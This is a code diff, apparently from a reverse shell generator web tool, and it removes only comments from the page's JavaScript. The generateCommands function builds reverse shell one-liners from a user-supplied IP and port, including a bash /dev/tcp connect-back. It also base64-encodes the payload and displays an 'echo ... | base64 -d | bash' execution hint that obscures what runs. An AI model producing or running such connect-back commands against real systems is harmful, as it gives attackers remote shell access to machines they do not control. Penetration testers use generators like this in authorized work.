@@ -1,18 +1,14 @@
 
 document.addEventListener('DOMContentLoaded', function() {
-  // Set the current year in the footer
   document.getElementById('currentYear').textContent = new Date().getFullYear();
   
-  // Initialize variables
   let ip = document.getElementById('ip').value;
   let port = document.getElementById('port').value;
   let selectedShell = 'bash';
   let protocol = 'tcp';
   
-  // Generate initial commands
   generateCommands();
   
-  // Setup event listeners
   document.getElementById('ip').addEventListener('input', function(e) {
     ip = e.target.value;
     generateCommands();
@@ -31,7 +27,6 @@ document.addEventListener('DOMContentLoaded', function() {
     });
   });
   
-  // Shell options
   const shellOptions = document.querySelectorAll('.shell-option');
   shellOptions.forEach(option => {
     option.addEventListener('click', function() {
@@ -42,13 +37,11 @@ document.addEventListener('DOMContentLoaded', function() {
     });
   });
   
-  // Tabs
   const tabs = document.querySelectorAll('.tab');
   tabs.forEach(tab => {
     tab.addEventListener('click', function() {
       const tabId = this.getAttribute('data-tab');
       
-      // Update active tab
       tabs.forEach(t => t.classList.remove('active'));
       this.classList.add('active');
       
@@ -63,7 +56,6 @@ document.addEventListener('DOMContentLoaded', function() {
     });
   });
   
-  // Copy buttons
   const copyButtons = document.querySelectorAll('.copy-button');
   copyButtons.forEach(button => {
     button.addEventListener('click', function() {
@@ -71,14 +63,12 @@ document.addEventListener('DOMContentLoaded', function() {
       const textToCopy = document.getElementById(targetId).textContent;
       
       navigator.clipboard.writeText(textToCopy).then(() => {
-        // Change icon temporarily to show success
         const originalIcon = this.innerHTML;
         this.innerHTML = '<i class="fas fa-check"></i>';
         setTimeout(() => {
           this.innerHTML = originalIcon;
         }, 2000);
         
-        // Show toast notification (simple implementation)
         showToast('Command copied to clipboard');
       }).catch(err => {
         showToast('Failed to copy: ' + err, true);
@@ -86,7 +76,6 @@ document.addEventListener('DOMContentLoaded', function() {
     });
   });
   
-  // Generate commands based on inputs
   function generateCommands() {
     let rawCommand = '';
     
@@ -113,23 +102,18 @@ document.addEventListener('DOMContentLoaded', function() {
         rawCommand = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
     }
     
-    // Update raw command
     document.getElementById('rawCommand').textContent = rawCommand;
     
-    // Generate and update encoded command
     const encodedCommand = btoa(rawCommand);
     document.getElementById('encodedCommand').textContent = encodedCommand;
     
-    // Update execution hint
     const executionHint = document.querySelector('.tab-content[data-tab-content="encoded"] .terminal-text:last-child');
     if (executionHint) {
       executionHint.textContent = `echo "${encodedCommand}" | base64 -d | bash`;
     }
   }
   
-  // Simple toast function
   function showToast(message, isError = false) {
-    // Create toast element if it doesn't exist
     let toast = document.getElementById('toast');
     if (!toast) {
       toast = document.createElement('div');
@@ -147,21 +131,17 @@ document.addEventListener('DOMContentLoaded', function() {
       document.body.appendChild(toast);
     }
     
-    // Set color based on error status
     toast.style.borderLeft = isError ? '4px solid #f44336' : '4px solid var(--neon-green)';
     
-    // Set message
     toast.textContent = message;
     toast.style.opacity = '1';
     
-    // Hide after 3 seconds
     setTimeout(() => {
       toast.style.opacity = '0';
     }, 3000);
   }
 });
 
-// Base64 encoding function for browsers that might not support btoa natively
 if (typeof btoa === 'undefined') {
   global.btoa = function (str) {
     return Buffer.from(str, 'binary').toString('base64');
